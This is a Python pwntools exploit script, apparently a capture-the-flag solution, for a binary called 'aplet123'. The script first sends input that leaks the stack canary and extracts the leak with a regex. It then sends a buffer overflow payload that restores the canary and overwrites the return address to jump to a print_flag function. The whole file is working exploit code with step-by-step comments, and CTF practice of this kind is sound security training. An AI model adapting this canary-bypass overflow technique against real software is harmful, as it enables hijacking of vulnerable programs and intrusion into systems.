from pwn import *
import re
import struct

#use p = remote('ip', port) for remote process
p = process('./aplet123')
#receive the starter text before it asks for input (not useful for us)
p.recv(1024)

#Compile the regex pattern to grab the leak from the output string
pattern = re.compile(rb"hi (.*?),")

#payload to cause the leak
leak_payload = b"A"*69 + b"I'm"

#send the leak payload
p.sendline(leak_payload)

#string containing canary leak
canary_leak = p.recv(1024)

#grab the actual leak from the string using the compiled regex
match = pattern.search(canary_leak)

#use the canary leak to overwrite the canary to bypass the stack check and overwrite the return address to print_flag function
#could be optimized a bit better but this works as long as one of the characters of the leak isn't a comma
payload = b"A"*72 + b"\x00" + match.group(1) + b"B"*7 + p64(0x4011e6) #B*7 instead of 8 since an extra byte is read from the saved rbp space

#send the payload
p.sendline(payload)

#send the command to cause main to try and exit via its return address
p.sendline(b"bye")

#print all output (should include the flag)
print(p.clean(2))

